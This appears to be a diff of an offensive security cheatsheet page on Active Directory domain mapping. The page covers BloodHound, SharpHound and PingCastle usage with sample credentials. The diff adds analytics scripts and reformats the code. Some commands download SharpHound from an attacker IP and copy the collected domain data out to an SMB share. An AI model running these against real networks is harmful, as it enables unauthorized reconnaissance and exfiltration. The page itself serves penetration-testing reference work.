@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2022-09-11T16:52:52 CEST">
+<meta name="revised" content="2023-02-14T12:07:01 CET">
 <title>Domain Mapping :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -27,7 +27,36 @@
     
       <header>
   <div class="logo">
-    <a class="baselink" href="/">Offensive Security Cheatsheet</a>
+    <head>
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+<a class="baselink" href="/">Offensive Security Cheatsheet</a>
+
   </div>
   <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
     <nav class="shortcuts">
@@ -1823,12 +1852,10 @@
     
     
     
-    
-
-<h3 id="bloodhound">BloodHound</h3>
+    <h3 id="bloodhound">BloodHound</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># /!\ Information here might be outdated</span>
-<span style="color:#75715e"># Future update incoming</span></code></pre></div>
-<h4 id="tips">Tips</h4>
+<span style="color:#75715e"># Future update incoming</span>
+</code></pre></div><h4 id="tips">Tips</h4>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Right Click</span>
 <span style="color:#75715e"># Get information about the node and also how to compromise the user / machine</span>
 
@@ -1845,13 +1872,14 @@
 <span style="color:#75715e"># CTRL+SHIFT+I --&gt; Developper Tools</span>
 <span style="color:#75715e"># CTRL+R --&gt; Reload display</span>
 
-<span style="color:#75715e"># Still possible to edit data to set what you want</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># If you don&#39;t have access to a domain machine but have creds</span>
+<span style="color:#75715e"># Still possible to edit data to set what you want</span>
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># If you don&#39;t have access to a domain machine but have creds</span>
 <span style="color:#75715e"># You can run from host</span>
 runas /netonly /user:FQDN.local<span style="color:#8045ff">\U</span>SER powershell
 <span style="color:#75715e"># Then</span>
 Import-Module Sharphound.ps1
-Invoke-BloodHound -ZipFileName <span style="color:#d88200">&#39;PATH/TO/ZIP.zip&#39;</span> -JsonFolder <span style="color:#d88200">&#39;PATH/TO/folderas above&#39;</span> -CollectionMethod All -Domain  FQDN</code></pre></div>
-<h5 id="setup">Setup</h5>
+Invoke-BloodHound -ZipFileName <span style="color:#d88200">&#39;PATH/TO/ZIP.zip&#39;</span> -JsonFolder <span style="color:#d88200">&#39;PATH/TO/folderas above&#39;</span> -CollectionMethod All -Domain  FQDN
+</code></pre></div><h5 id="setup">Setup</h5>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Bloodhound directement depuis la machine cible</span>
 <span style="color:#75715e"># apt-get install bloodhound</span>
 
@@ -1863,8 +1891,8 @@ user/pass <span style="color:#f92672">=</span> neo4j/neo4j
 
 <span style="color:#75715e"># Start</span>
 $ bloodhound
-URL : bolt://127.0.0.1:7687</code></pre></div>
-<h5 id="target-collection">Target Collection</h5>
+URL : bolt://127.0.0.1:7687
+</code></pre></div><h5 id="target-collection">Target Collection</h5>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># On the target, drop the Sharphound ingestor</span>
 <span style="color:#75715e"># You can drop it through shared folder or by download</span>
 https://github.com/BloodHoundAD/BloodHound
@@ -1885,11 +1913,13 @@ C:<span style="color:#8045ff">\&gt;</span> SharpHound.exe
 C:<span style="color:#8045ff">\&gt;</span> SharpHound.exe — CollectionMethod SessionLoop — MaxLoopTime 1h
 C:<span style="color:#8045ff">\&gt;</span> SharpHound.exe — CollectionMethod ACL
 
-.<span style="color:#8045ff">\S</span>harpHound.exe --domain UCA.LAN --domaincontroller <span style="color:#ae81ff">192</span>.168.30.10 --ldapusername <span style="color:#d88200">&#34;die-hardman&#34;</span> --ldappassword <span style="color:#d88200">&#34;maskonyourface&#34;</span> --CollectionMethod Group,LocalGroup,GPOLocalGroup,Session,LoggedOn,ObjectProps,ACL,ComputerOnly,Trusts,Default,RDP,DCOM,DCOnly</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Python based ingestor (for remote work)</span>
+.<span style="color:#8045ff">\S</span>harpHound.exe --domain UCA.LAN --domaincontroller 192.168.30.10 --ldapusername <span style="color:#d88200">&#34;die-hardman&#34;</span> --ldappassword <span style="color:#d88200">&#34;maskonyourface&#34;</span> --CollectionMethod Group,LocalGroup,GPOLocalGroup,Session,LoggedOn,ObjectProps,ACL,ComputerOnly,Trusts,Default,RDP,DCOM,DCOnly
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Python based ingestor (for remote work)</span>
 https://github.com/fox-it/BloodHound.py
 
 <span style="color:#75715e"># Collection Methods : Default, Group, LocalAdmin, RDP, DCOM, Session, Acl, Trusts, LoggedOn, ObjectProps, All (except LoggedOn)</span>
-bloodhound-python -u USERNAME -p PASSWORD -d DOMAIN --collectionmethod All,LoggedOn</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Drop BloodHound ingestor and get results back through SMB Server</span>
+bloodhound-python -u USERNAME -p PASSWORD -d DOMAIN --collectionmethod All,LoggedOn
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Drop BloodHound ingestor and get results back through SMB Server</span>
 python -m SimpleHTTPServer
 Invoke-WebRequest -Uri “http://10.10.16.112:8000/SharpHound.ps1” -OutFile “.<span style="color:#8045ff">\S</span>harpHound.ps1”
 
@@ -1901,13 +1931,14 @@ Invoke-BloodHound -CollectionMethod All
 <span style="color:#75715e"># Since Windows 10 you can&#39;t do anonymous smbserver anymore</span>
 sudo python smbserver.py SDFR /BloodHound/Ingestors -smb2support -username <span style="color:#d88200">&#34;peon&#34;</span> -password <span style="color:#d88200">&#34;peon&#34;</span>
 
-net use Z: <span style="color:#8045ff">\\</span><span style="color:#ae81ff">192</span>.168.30.130<span style="color:#8045ff">\S</span>DFR /user:peon peon
+net use Z: <span style="color:#8045ff">\\</span>192.168.30.130<span style="color:#8045ff">\S</span>DFR /user:peon peon
 net use Z: /delete /y
 
-copy C:<span style="color:#8045ff">\U</span>sers<span style="color:#8045ff">\x</span>xx<span style="color:#8045ff">\D</span>ocuments<span style="color:#8045ff">\2</span>0191104044628_BloodHound.zip <span style="color:#8045ff">\\</span><span style="color:#ae81ff">10</span>.10.16.112<span style="color:#8045ff">\T</span>ESTLOL<span style="color:#8045ff">\f</span>ile.zip</code></pre></div>
-<h4 id="analysis">Analysis</h4>
+copy C:<span style="color:#8045ff">\U</span>sers<span style="color:#8045ff">\x</span>xx<span style="color:#8045ff">\D</span>ocuments<span style="color:#8045ff">\2</span>0191104044628_BloodHound.zip <span style="color:#8045ff">\\</span>10.10.16.112<span style="color:#8045ff">\T</span>ESTLOL<span style="color:#8045ff">\f</span>ile.zip
+</code></pre></div><h4 id="analysis">Analysis</h4>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Results will be zipped</span>
-<span style="color:#75715e"># Get back zip, unzip it and upload files into bloodhound</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Custom queries</span>
+<span style="color:#75715e"># Get back zip, unzip it and upload files into bloodhound</span>
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Custom queries</span>
 https://github.com/hausec/Bloodhound-Custom-Queries
 
 <span style="color:#75715e"># Replace or update the following file</span>
@@ -1917,7 +1948,7 @@ C:<span style="color:#8045ff">\U</span>sers<span style="color:#f92672">[</span>U
 https://github.com/seajaysec/cypheroth/
 
 ./cypheroth.sh -u neo4j -p BloodHound -d TESTLAB.LOCAL
-./cypheroth.sh -u neo4j -p hunter2 -d BigTech.corp -a <span style="color:#ae81ff">10</span>.0.0.1:7687 -t 5m -v <span style="color:#111">true</span>
+./cypheroth.sh -u neo4j -p hunter2 -d BigTech.corp -a 10.0.0.1:7687 -t 5m -v <span style="color:#111">true</span>
 
 <span style="color:#75715e"># Some quickwin queries against a BloodHound database</span>
 https://github.com/kaluche/bloodhound-quickwin
@@ -1931,9 +1962,8 @@ https://twitter.com/n00py1/status/1508868743451090944?t<span style="color:#f9267
 <span style="color:#75715e"># - Find all computers that can perform unconstrained delegation but are not DCs</span>
 <span style="color:#75715e"># - Find any object that has inbound control over the domain. Mark them all as high value. Mark the domain as high value also.</span>
 <span style="color:#75715e"># - Find groups that can reset passwords. Mark these groups as high value.</span>
-<span style="color:#75715e"># - Then : MATCH p=shortestPath((g {owned:true})-[*1..]-&gt;(n {highvalue:true})) WHERE g&lt;&gt;n return p</span></code></pre></div>
-<p><br/></p>
-
+<span style="color:#75715e"># - Then : MATCH p=shortestPath((g {owned:true})-[*1..]-&gt;(n {highvalue:true})) WHERE g&lt;&gt;n return p</span>
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="pingcastle">PingCastle</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Lien : https://www.pingcastle.com/PingCastleFiles/PingCastle_2.4.3.0.zip
 &gt; Drop exe on the target
@@ -1942,11 +1972,9 @@ https://twitter.com/n00py1/status/1508868743451090944?t<span style="color:#f9267
 
 &gt; Mode CLI :
 &gt; PingCastle --healthcheck --server mydomain.com
-&gt; PingCastle --carto</code></pre></div>
-<p><br/></p>
-
+&gt; PingCastle --carto
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="adaclscanner">ADACLScanner</h3>
-
 <p>TODO</p>
 
 
